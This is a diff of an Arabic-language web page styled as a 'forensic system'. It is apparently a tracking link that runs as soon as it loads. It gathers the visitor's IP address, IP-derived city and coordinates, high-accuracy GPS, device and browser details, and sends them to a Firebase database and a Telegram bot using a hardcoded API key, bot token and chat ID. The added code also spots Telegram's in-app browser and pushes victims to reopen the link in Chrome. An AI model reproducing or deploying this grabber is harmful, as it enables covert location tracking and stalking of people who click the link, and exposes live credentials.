@@ -3,129 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>النظام الجنائي - البيانات الشاملة</title>
+    <title>النظام الجنائي - البيانات الكاملة</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}
-        html,body{width:100%;height:100%;overflow-x:hidden}
-        body{background:#000;color:#0f0;padding:10px;
-            background-image:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,0,0.03) 2px),
-            repeating-linear-gradient(90deg,transparent,transparent 2px,rgba(0,255,0,0.03) 2px)}
-        .container{max-width:800px;margin:0 auto;background:rgba(0,20,0,0.95);
-            border:2px solid #0f0;border-radius:5px;padding:20px;
-            box-shadow:0 0 30px rgba(0,255,0,0.3);position:relative;width:100%}
-        h1{text-align:center;color:#0f0;font-size:1.5rem;margin-bottom:5px;
-            text-shadow:0 0 10px #0f0;border-bottom:1px solid #0f0;padding-bottom:10px}
-        .subtitle{text-align:center;color:#0a0;font-size:0.8rem;margin-bottom:20px}
-        .status-box{background:rgba(0,255,0,0.1);border:1px solid #0f0;
-            padding:15px;margin:15px 0;border-radius:5px;text-align:center}
-        .status-box.connecting{color:#ff0;border-color:#ff0;animation:pulse-yellow 2s infinite}
-        .status-box.connected{color:#0f0;border-color:#0f0;animation:pulse-green 2s infinite}
-        @keyframes pulse-yellow{0%,100%{box-shadow:0 0 5px rgba(255,255,0,0.3)}50%{box-shadow:0 0 20px rgba(255,255,0,0.6)}}
-        @keyframes pulse-green{0%,100%{box-shadow:0 0 5px rgba(0,255,0,0.3)}50%{box-shadow:0 0 20px rgba(0,255,0,0.6)}}
-        .data-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:15px 0}
-        .data-box{background:rgba(0,255,0,0.05);border:1px solid #0a0;padding:10px;border-radius:3px}
-        .data-box.full{grid-column:span 2}.data-box.critical{border-color:#0f0}
-        .label{color:#0a0;font-size:0.75rem;margin-bottom:5px}
-        .value{color:#0f0;font-size:0.9rem;font-weight:bold;word-break:break-all}
-        .value.pending{color:#0a0;animation:blink 1s infinite}
-        @keyframes blink{50%{opacity:0.3}}
-        #map{height:300px;width:100%;margin:15px 0;border:2px solid #0f0;border-radius:5px;display:none}
-        .log-console{background:#000;border:1px solid #0a0;padding:10px;
-            margin:15px 0;font-size:0.7rem;height:150px;overflow-y:auto;color:#0a0;direction:ltr;text-align:left}
-        .log-line{margin:3px 0}.log-line.success{color:#0f0}.log-line.error{color:#f00}
-        .log-line.warn{color:#ff0}.log-line.info{color:#0a0}
-        .progress-bar{width:100%;height:4px;background:#0a0;margin:10px 0;border-radius:2px;overflow:hidden}
-        .progress-fill{height:100%;background:#0f0;width:0%;transition:width 0.3s}
-        @media(max-width:600px){.data-grid{grid-template-columns:1fr}.data-box.full{grid-column:span 1}h1{font-size:1.2rem}}
+        body{background:#000;color:#0f0;padding:10px}
+        .container{max-width:800px;margin:0 auto;background:rgba(0,20,0,0.95);border:2px solid #0f0;border-radius:5px;padding:20px}
+        h1{text-align:center;color:#0f0;margin-bottom:10px}
+        .warning{background:rgba(255,165,0,0.2);border:2px solid #ffa500;color:#ffa500;padding:15px;margin:15px 0;border-radius:5px;text-align:center}
+        .success{background:rgba(0,255,0,0.2);border:2px solid #0f0;color:#0f0;padding:15px;margin:15px 0;border-radius:5px;text-align:center}
+        .data-box{background:rgba(0,255,0,0.05);border:1px solid #0a0;padding:10px;margin:10px 0;border-radius:3px}
+        .label{color:#0a0;font-size:0.8rem;margin-bottom:5px}
+        .value{color:#0f0;font-size:0.95rem;font-weight:bold;word-break:break-all}
+        .log-console{background:#000;border:1px solid #0a0;padding:10px;margin:15px 0;font-size:0.7rem;height:200px;overflow-y:auto;color:#0a0}
+        .log-line{margin:3px 0}.log-line.success{color:#0f0}.log-line.error{color:#f00}.log-line.warn{color:#ff0}
+        button{width:100%;padding:15px;background:#0f0;color:#000;border:none;border-radius:5px;font-weight:bold;margin:10px 0;cursor:pointer}
+        button:hover{background:#0a0}
+        #map{height:300px;width:100%;margin:15px 0;border:2px solid #0f0;display:none}
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🛡️ النظام الجنائي - الشامل</h1>
-        <div class="subtitle">جمع البيانات التفصيلية</div>
+        <h1>🛡️ النظام الجنائي</h1>
         
-        <div class="status-box connecting" id="statusBox">
-            <div id="statusText">🔄 جاري جمع البيانات...</div>
-            <div class="progress-bar"><div class="progress-fill" id="progressBar"></div></div>        </div>
+        <div id="telegramWarning" class="warning" style="display:none">
+            ⚠️ <strong>تحذير:</strong> أنت تستخدم Telegram WebView<br>
+            العديد من الميزات معطلة!<br>
+            <strong>افتح الرابط في متصفح Chrome للحصول على بيانات كاملة</strong>
+        </div>
+
+        <div id="successMsg" class="success" style="display:none">
+            ✅ تم جمع البيانات بنجاح!<br>
+            <small>تحقق من Firebase و Telegram</small>
+        </div>
+
+        <div id="dataContainer"></div>
         
         <div id="map"></div>
         
-        <div class="data-grid">
-            <div class="data-box critical full">
-                <div class="label">🌐 IP Address (العنوان الخارجي)</div>
-                <div class="value pending" id="ip">جاري التحليل...</div>
-            </div>
-            <div class="data-box critical">
-                <div class="label">📍 الدولة</div>
-                <div class="value" id="country">-</div>
-            </div>
-            <div class="data-box critical">
-                <div class="label">🏙️ المدينة</div>
-                <div class="value" id="city">-</div>
-            </div>
-            <div class="data-box critical">
-                <div class="label">🎯 خط العرض (LAT)</div>
-                <div class="value" id="lat">-</div>
-            </div>
-            <div class="data-box critical">
-                <div class="label">🎯 خط الطول (LNG)</div>
-                <div class="value" id="lng">-</div>
-            </div>
-            <div class="data-box">
-                <div class="label">🏢 مزود الخدمة (ISP)</div>
-                <div class="value" id="isp">-</div>
-            </div>
-            <div class="data-box">
-                <div class="label">📡 نوع الاتصال</div>
-                <div class="value" id="connection">-</div>
-            </div>
-            <div class="data-box">
-                <div class="label">💻 نظام التشغيل</div>
-                <div class="value" id="os">-</div>
-            </div>
-            <div class="data-box">
-                <div class="label">🌐 المتصفح</div>
-                <div class="value" id="browser">-</div>
-            </div>
-            <div class="data-box">
-                <div class="label">📱 دقة الشاشة</div>
-                <div class="value" id="screen">-</div>
-            </div>
-            <div class="data-box">
-                <div class="label">🎨 عمق الألوان</div>
-                <div class="value" id="colorDepth">-</div>
-            </div>
-            <div class="data-box">                <div class="label">⏰ المنطقة الزمنية</div>
-                <div class="value" id="timezone">-</div>
-            </div>
-            <div class="data-box">
-                <div class="label">🌍 اللغة</div>
-                <div class="value" id="language">-</div>
-            </div>
-            <div class="data-box">
-                <div class="label">💾 الذاكرة (RAM)</div>
-                <div class="value" id="memory">-</div>
-            </div>
-            <div class="data-box full">
-                <div class="label">🔗 الرابط الكامل</div>
-                <div class="value" id="url" style="font-size:0.7rem">-</div>
-            </div>
-            <div class="data-box full">
-                <div class="label">🖥️ معلومات الجهاز الكاملة</div>
-                <div class="value" id="deviceInfo" style="font-size:0.7rem">-</div>
-            </div>
-        </div>
+        <button onclick="collectData()">🔄 إعادة جمع البيانات</button>
         
         <div class="log-console" id="console"></div>
     </div>
 
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
     <script>
-        // ✅ إعدادات Firebase
         const firebaseConfig = {
             apiKey: "AIzaSyCVyg-EAtI-oumlWnBOVNKBjwufbTS6H5w",
             authDomain: "onx-gp-aade0.firebaseapp.com",
@@ -139,415 +63,216 @@
 
         const BOT_TOKEN = "7735965641:AAFzkUy27zKXYWroodhdxOBapMgwttyq5_s";
         const CHAT_ID = "910624538";
-        
-        let data = {
-            id: Date.now(),
-            timestamp: '',
-            ip: '', country: '', city: '', lat: '', lng: '',
-            isp: '', accuracy: '', connection: '', os: '',
-            browser: '', screen: '', colorDepth: '', timezone: '',            language: '', memory: '', url: '', deviceInfo: '',
-            userAgent: '', platform: '', cpu: ''
-        };
-        
-        let firebaseConnected = false;
-        let telegramSent = false;
-        let map = null;
-        let progress = 0;
+        let data = {}, map = null;
 
-        function updateProgress(percent, message) {
-            progress = percent;
-            document.getElementById('progressBar').style.width = percent + '%';
-            document.getElementById('statusText').innerText = message;
-        }
-
-        function updateElement(id, value) {
-            const el = document.getElementById(id);
-            if (el) {
-                el.innerText = value || 'N/A';
-            }
-        }
-
-        function log(msg, type = 'info') {
-            const consoleEl = document.getElementById('console');
-            if (consoleEl) {
-                const line = document.createElement('div');
-                line.className = `log-line ${type}`;
-                line.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-                consoleEl.appendChild(line);
-                consoleEl.scrollTop = consoleEl.scrollHeight;
-            }
+        function log(msg, type='info') {
+            const c = document.getElementById('console');
+            const l = document.createElement('div');
+            l.className = `log-line ${type}`;
+            l.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            c.appendChild(l);
+            c.scrollTop = c.scrollHeight;
             console.log(type, msg);
         }
 
-        function updateStatus(text, type) {
-            const box = document.getElementById('statusBox');
-            const textEl = document.getElementById('statusText');
-            if (box && textEl) {
-                textEl.innerText = text;
-                box.className = 'status-box ' + type;
-            }
+        // 🔍 كشف إذا كان المستخدم داخل Telegram
+        function isTelegramWebView() {
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+            return (/telegram|tgweb/i.test(ua)) || 
+                   (/content:\/\/org\.telegram/i.test(window.location.href));
         }
 
-        // 🔍 تحليل مفصل لـ User Agent
-        function parseUserAgent() {
-            const ua = navigator.userAgent;
-            const platform = navigator.platform;
-            
-            // نظام التشغيل
-            if (ua.includes('Android')) {                data.os = 'Android';
-                const androidMatch = ua.match(/Android (\d+\.\d+)/);
-                if (androidMatch) data.os += ` ${androidMatch[1]}`;
-            } else if (ua.includes('iPhone') || ua.includes('iPad')) {
-                data.os = 'iOS';
-                const iosMatch = ua.match(/OS (\d+)_/);
-                if (iosMatch) data.os += ` ${iosMatch[1]}.x`;
-            } else if (ua.includes('Windows')) {
-                data.os = 'Windows';
-                if (ua.includes('Windows NT 10')) data.os += ' 10';
-                else if (ua.includes('Windows NT 6.3')) data.os += ' 8.1';
-            } else if (ua.includes('Mac')) {
-                data.os = 'macOS';
-            } else if (ua.includes('Linux')) {
-                data.os = 'Linux';
-            } else {
-                data.os = platform || 'Unknown';
-            }
-            
-            // المتصفح
-            if (ua.includes('Chrome') && !ua.includes('Edg')) {
-                const chromeMatch = ua.match(/Chrome\/(\d+\.\d+)/);
-                data.browser = `Chrome ${chromeMatch ? chromeMatch[1] : ''}`;
-            } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
-                data.browser = 'Safari';
-            } else if (ua.includes('Firefox')) {
-                const firefoxMatch = ua.match(/Firefox\/(\d+\.\d+)/);
-                data.browser = `Firefox ${firefoxMatch ? firefoxMatch[1] : ''}`;
-            } else if (ua.includes('Edg')) {
-                data.browser = 'Microsoft Edge';
-            } else {
-                data.browser = 'Unknown Browser';
-            }
-            
-            data.userAgent = ua;
-            data.platform = platform;
-            data.cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'Unknown';
-        }
-
-        // 🌐 جلب IP بـ 5 طرق مختلفة
-        async function getIPData() {
-            log('🔍 جاري جلب IP...', 'info');
-            updateProgress(20, 'جلب معلومات IP...');
-            
+        // 🌐 جلب IP مع 3 محاولات
+        async function getIP() {
             const apis = [
-                { name: 'ipapi.co', url: 'https://ipapi.co/json/' },
-                { name: 'ip-api', url: 'https://ip-api.com/json/' },
-                { name: 'ipinfo', url: 'https://ipinfo.io/json/' },
-                { name: 'ip.sb', url: 'https://api.ip.sb/geoip' },
-                { name: 'myip', url: 'https://api.myip.com' }            ];
+                'https://api.ipify.org?format=json',
+                'https://api64.ipify.org?format=json',
+                'https://api.myip.com'
+            ];
             
             for (let api of apis) {
                 try {
-                    const controller = new AbortController();
-                    const timeout = setTimeout(() => controller.abort(), 5000);
-                    
-                    const response = await fetch(api.url, { signal: controller.signal });
-                    clearTimeout(timeout);
-                    
-                    const result = await response.json();
-                    
-                    // استخراج البيانات من أي API
-                    data.ip = result.ip || result.query || 'Unknown';
-                    data.country = result.country_name || result.country || 'Unknown';
-                    data.city = result.city || 'Unknown';
-                    data.isp = result.org || result.isp || result.asn || 'Unknown';
-                    data.lat = result.latitude || result.lat || '';
-                    data.lng = result.longitude || result.lon || '';
-                    
-                    updateElement('ip', data.ip);
-                    updateElement('country', data.country);
-                    updateElement('city', data.city);
-                    updateElement('isp', data.isp);
-                    
-                    log(`✓ IP من ${api.name}: ${data.ip}`, 'success');
-                    updateProgress(40, 'تم جلب IP والموقع');
-                    return true;
-                    
-                } catch (e) {
-                    log(`✗ فشل ${api.name}`, 'warn');
-                }
+                    const res = await fetch(api, {timeout: 5000});
+                    const json = await res.json();
+                    return json.ip || json.IPAddress;
+                } catch(e) {
+                    log(`فشل ${api}`, 'warn');                }
             }
-            
-            // Fallback: استخدام WebRTC لاكتشاف IP المحلي
-            try {
-                const localIP = await getLocalIP();
-                data.ip = localIP || 'Unknown';
-                updateElement('ip', data.ip + ' (Local)');
-                log(`✓ IP المحلي: ${data.ip}`, 'warn');
-            } catch (e) {
-                updateElement('ip', 'Unknown');
-                log('✗ فشل جلب IP', 'error');
-            }
-            
-            updateProgress(40, 'تم (بعض البيانات غير متوفرة)');
-            return false;
+            return null;
         }
 
-        // 🔧 الحصول على IP المحلي عبر WebRTC        function getLocalIP() {
-            return new Promise((resolve) => {
-                const pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                
-                pc.onicecandidate = (ice) => {
-                    if (!ice || !ice.candidate || !ice.candidate.candidate) {
-                        resolve('Unknown');
-                    } else {
-                        const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
-                        resolve(myIP);
-                    }
+        // 📍 جلب الموقع من IP
+        async function getIPLocation(ip) {
+            try {
+                const res = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await res.json();
+                return {
+                    country: data.country_name,
+                    city: data.city,
+                    isp: data.org,
+                    lat: data.latitude,
+                    lng: data.longitude
                 };
-                
-                setTimeout(() => resolve('Unknown'), 3000);
-            });
-        }
-
-        // 📍 GPS مع تفاصيل أكثر
-        function getGPS() {
-            return new Promise(resolve => {
-                if (!navigator.geolocation) {
-                    log('GPS غير مدعوم', 'error');
-                    updateElement('lat', 'Not Supported');
-                    updateElement('lng', 'Not Supported');
-                    resolve(false);
-                    return;
-                }
-                
-                log('🛰️ جاري طلب GPS...', 'info');
-                updateProgress(60, 'طلب إذن GPS...');
-                
-                navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        data.lat = pos.coords.latitude.toFixed(6);
-                        data.lng = pos.coords.longitude.toFixed(6);
-                        data.accuracy = pos.coords.accuracy.toFixed(2);
-                        const altitude = pos.coords.altitude || 'N/A';
-                        const speed = pos.coords.speed || 'N/A';
-                        
-                        updateElement('lat', data.lat);
-                        updateElement('lng', data.lng);
-                        
-                        log(`✓ GPS: ${data.lat}, ${data.lng}`, 'success');
-                        log(`📊 الدقة: ${data.accuracy}م, الارتفاع: ${altitude}م`, 'info');
-                        
-                        initMap(parseFloat(data.lat), parseFloat(data.lng));
-                        updateProgress(80, 'تم تحديد الموقع بدقة');
-                        resolve(true);                    },
-                    err => {
-                        log(`✗ GPS: ${err.message}`, 'error');
-                        updateElement('lat', 'Denied');
-                        updateElement('lng', 'Denied');
-                        
-                        // استخدام IP-based location كـ fallback
-                        if (data.lat && data.lng) {
-                            log('📍 استخدام موقع IP كبديل', 'warn');
-                            initMap(parseFloat(data.lat), parseFloat(data.lng));
-                        }
-                        
-                        updateProgress(80, 'GPS مرفوض - استخدام IP');
-                        resolve(false);
-                    },
-                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
-                );
-            });
-        }
-
-        function initMap(lat, lng) {
-            const mapEl = document.getElementById('map');
-            if (mapEl) {
-                mapEl.style.display = 'block';
-            }
-            
-            if (!map) {
-                map = L.map('map').setView([lat, lng], 15);
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                    attribution: '© OpenStreetMap'
-                }).addTo(map);
-                L.marker([lat, lng]).addTo(map)
-                    .bindPopup(`📍 الموقع<br>الدقة: ${data.accuracy || 'N/A'}م`)
-                    .openPopup();
-                log('✓ الخريطة مفتوحة', 'success');
-            } else {
-                map.setView([lat, lng], 15);
-            }
-        }
-
-        // 💻 جمع بيانات الجهاز المتقدمة
-        function getDeviceData() {
-            log('📱 جمع بيانات الجهاز...', 'info');
-            updateProgress(10, 'تحليل الجهاز...');
-            
-            parseUserAgent();
-            
-            data.screen = `${screen.width}x${screen.height} (${screen.availWidth}x${screen.availHeight})`;
-            data.colorDepth = `${screen.colorDepth}-bit (${screen.pixelDepth}bit)`;
-            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;            data.language = navigator.language || navigator.userLanguage || 'Unknown';
-            data.memory = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : 'Unknown';
-            data.url = window.location.href;
-            data.timestamp = new Date().toISOString();
-            
-            // معلومات إضافية
-            const onlineStatus = navigator.onLine ? 'Online' : 'Offline';
-            const cookieEnabled = navigator.cookieEnabled ? 'Enabled' : 'Disabled';
-            const doNotTrack = navigator.doNotTrack || 'Unknown';
-            
-            data.deviceInfo = `OS: ${data.os}\nBrowser: ${data.browser}\nPlatform: ${data.platform}\nCPU: ${data.cpu}\nRAM: ${data.memory}\nScreen: ${data.screen}\nColor Depth: ${data.colorDepth}\nTimezone: ${data.timezone}\nLanguage: ${data.language}\nOnline: ${onlineStatus}\nCookies: ${cookieEnabled}\nDo Not Track: ${doNotTrack}\nUser Agent: ${data.userAgent.substring(0, 100)}...`;
-            
-            updateElement('os', data.os);
-            updateElement('browser', data.browser);
-            updateElement('screen', data.screen);
-            updateElement('colorDepth', data.colorDepth);
-            updateElement('timezone', data.timezone);
-            updateElement('language', data.language);
-            updateElement('memory', data.memory);
-            updateElement('url', data.url);
-            updateElement('deviceInfo', data.deviceInfo);
-            
-            // Network info
-            const conn = navigator.connection;
-            if (conn) {
-                data.connection = `${conn.effectiveType || 'unknown'} (${conn.downlink || '?'}Mbps, RTT: ${conn.rtt || '?'}ms)`;
-                updateElement('connection', data.connection);
-            }
-            
-            log('✓ بيانات الجهاز مكتملة', 'success');
-            updateProgress(30, 'تم جمع بيانات الجهاز');
-        }
-
-        // 🔗 Firebase
-        function initFirebase() {
-            try {
-                log('🔗 جاري الاتصال بـ Firebase...', 'info');
-                firebase.initializeApp(firebaseConfig);
-                const db = firebase.database();
-                
-                const connectedRef = db.ref('.info/connected');
-                connectedRef.on('value', snap => {
-                    if (snap.val() === true) {
-                        firebaseConnected = true;
-                        log('✓ Firebase متصل', 'success');
-                    } else {
-                        firebaseConnected = false;
-                        log('✗ Firebase غير متصل', 'error');
-                    }
-                });                return db;
-            } catch (e) {
-                log('✗ فشل Firebase: ' + e.message, 'error');
+            } catch(e) {
                 return null;
             }
         }
 
-        async function saveToFirebase(db, data) {
-            if (!db) return false;
-            try {
-                await db.ref('tracking/' + data.id).set(data);
-                log('✓ حُفظ في Firebase', 'success');
-                return true;
-            } catch (e) {
-                log('✗ فشل الحفظ: ' + e.message, 'error');
-                return false;
+        // 🛰️ GPS
+        function getGPS() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        resolve({
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        });
+                    },
+                    err => {
+                        log(`GPS Error: ${err.message}`, 'error');
+                        resolve(null);
+                    },
+                    {enableHighAccuracy: true, timeout: 10000}
+                );
+            });
+        }
+
+        // 📊 جمع كل البيانات
+        async function collectData() {
+            log('=== بدء جمع البيانات ===', 'warn');            document.getElementById('dataContainer').innerHTML = '';
+            
+            // بيانات أساسية
+            data = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                os: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                online: navigator.onLine
+            };
+
+            // 🔍 كشف Telegram
+            if (isTelegramWebView()) {
+                document.getElementById('telegramWarning').style.display = 'block';
+                log('⚠️ Telegram WebView detected - محدود!', 'error');
+            }
+
+            // 🌐 IP
+            log('جاري جلب IP...', 'info');
+            const ip = await getIP();
+            if (ip) {
+                data.ip = ip;
+                log(`✓ IP: ${ip}`, 'success');
+                
+                // موقع من IP
+                const loc = await getIPLocation(ip);
+                if (loc) {
+                    data.country = loc.country;
+                    data.city = loc.city;
+                    data.isp = loc.isp;
+                    data.latIP = loc.lat;
+                    data.lngIP = loc.lng;
+                    log(`✓ الموقع: ${loc.city}, ${loc.country}`, 'success');
+                }
+            } else {
+                data.ip = 'Unknown';
+                log('✗ فشل جلب IP', 'error');
+            }
+
+            // 🛰️ GPS
+            log('جاري طلب GPS...', 'info');
+            const gps = await getGPS();
+            if (gps) {
+                data.lat = gps.lat;
+                data.lng = gps.lng;
+                data.accuracy = gps.accuracy;
+                log(`✓ GPS: ${gps.lat}, ${gps.lng}`, 'success');
+                showMap(gps.lat, gps.lng);            } else {
+                log('✗ GPS مرفوض أو غير متوفر', 'error');
+            }
+
+            // عرض البيانات
+            displayData();
+            
+            // إرسال
+            await sendToFirebase();
+            await sendToTelegram();
+            
+            document.getElementById('successMsg').style.display = 'block';
+            log('=== اكتمل ===', 'success');
+        }
+
+        function showMap(lat, lng) {
+            const mapEl = document.getElementById('map');
+            mapEl.style.display = 'block';
+            if (!map) {
+                map = L.map('map').setView([lat, lng], 15);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                L.marker([lat, lng]).addTo(map).bindPopup('📍 موقعك').openPopup();
             }
         }
 
-        // 📨 Telegram
-        async function sendToTelegram() {
-            if (telegramSent) return;
-            log('📨 جاري الإرسال لتليجرام...', 'info');
-            
+        function displayData() {
+            const container = document.getElementById('dataContainer');
+            container.innerHTML = `
+                <div class="data-box"><div class="label">🌐 IP</div><div class="value">${data.ip || 'N/A'}</div></div>
+                <div class="data-box"><div class="label">📍 الموقع</div><div class="value">${data.city || ''}, ${data.country || ''}</div></div>
+                <div class="data-box"><div class="label">🏢 ISP</div><div class="value">${data.isp || 'N/A'}</div></div>
+                <div class="data-box"><div class="label">🎯 GPS</div><div class="value">${data.lat ? `${data.lat}, ${data.lng}` : 'غير متوفر'}</div></div>
+                <div class="data-box"><div class="label">💻 النظام</div><div class="value">${data.os || 'Unknown'}</div></div>
+                <div class="data-box"><div class="label">📱 الشاشة</div><div class="value">${data.screen}</div></div>
+            `;
+        }
+
+        async function sendToFirebase() {
             try {
-                let msg = `🚨 *تقرير تتبع شامل*\n\n`;
-                msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-                msg += `🌐 *IP:* \`${data.ip}\`\n`;
-                msg += `📍 *الموقع:* ${data.city}, ${data.country}\n`;
-                msg += `🏢 *ISP:* ${data.isp}\n`;
-                msg += `📡 *الاتصال:* ${data.connection}\n\n`;
-                
-                if (data.lat && data.lat !== 'Denied' && data.lat !== 'Not Supported') {
-                    msg += `🎯 *GPS دقيق:*\n`;
-                    msg += `LAT: \`${data.lat}\`\n`;
-                    msg += `LNG: \`${data.lng}\`\n`;
-                    msg += `الدقة: ${data.accuracy}م\n\n`;
-                }
-                
-                msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-                msg += `💻 *الجهاز:*\n`;
-                msg += `OS: ${data.os}\n`;
-                msg += `Browser: ${data.browser}\n`;
-                msg += `Screen: ${data.screen}\n`;
-                msg += `RAM: ${data.memory}\n`;
-                msg += `Language: ${data.language}\n\n`;
-                
-                msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-                msg += `🕒 *الوقت:* ${new Date().toLocaleString('ar-SA')}\n`;
-                msg += `🔗 *الرابط:* ${data.url}`;
+                firebase.initializeApp(firebaseConfig);
+                const db = firebase.database();
+                await db.ref('tracking/' + Date.now()).set(data);
+                log('✓ Firebase: تم الحفظ', 'success');
+            } catch(e) {
+                log('✗ Firebase Failed', 'error');
+            }
+        }
+
+        async function sendToTelegram() {
+            try {                let msg = `🚨 *تقرير جديد*\n\n`;
+                msg += `🌐 IP: \`${data.ip}\`\n`;
+                msg += `📍 الموقع: ${data.city || 'Unknown'}, ${data.country || 'Unknown'}\n`;
+                if (data.lat) msg += `🎯 GPS: ${data.lat}, ${data.lng}\n`;
+                msg += `💻 النظام: ${data.os}\n`;
+                msg += `📱 الشاشة: ${data.screen}\n`;
+                msg += `🕒 ${new Date().toLocaleString('ar-SA')}`;
+
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: msg,
-                        parse_mode: 'Markdown'
-                    })
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
                 });
-
-                if (data.lat && data.lat !== 'Denied' && data.lat !== 'Not Supported') {
+                
+                if (data.lat) {
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            latitude: parseFloat(data.lat),
-                            longitude: parseFloat(data.lng)
-                        })
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({chat_id: CHAT_ID, latitude: data.lat, longitude: data.lng})
                     });
-                    log('✓ أُرسل الموقع كـ Location', 'success');
                 }
-
-                log('✓ أُرسل لتليجرام بنجاح!', 'success');
-                telegramSent = true;
-            } catch (e) {
-                log('✗ فشل الإرسال: ' + e.message, 'error');
+                
+                log('✓ Telegram: تم الإرسال', 'success');
+            } catch(e) {
+                log('✗ Telegram Failed', 'error');
             }
         }
 
-        // 🚀 التشغيل الرئيسي
-        async function init() {
-            log('=== بدء النظام الجنائي الشامل ===', 'warn');
-            updateProgress(0, 'بدء جمع البيانات...');
-            
-            const db = initFirebase();
-            
-            // جمع البيانات بالتسلسل
-            getDeviceData();
-            await getIPData();
-            await getGPS();
-            
-            // الحفظ والإرسال
-            if (firebaseConnected && db) {
-                await saveToFirebase(db, data);
-            }
-            
-            await sendToTelegram();
-                        log('=== اكتمل جمع جميع البيانات ===', 'success');
-            updateProgress(100, '✅ اكتمل - تم الإرسال');
-            updateStatus('✅ تم جمع وإرسال جميع البيانات', 'connected');
-        }
-
-        // تشغيل عند تحميل الصفحة
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', init);
-        } else {
-            init();
-        }
+        // بدء تلقائي
+        window.onload = collectData;
     </script>
 </body>
 </html>
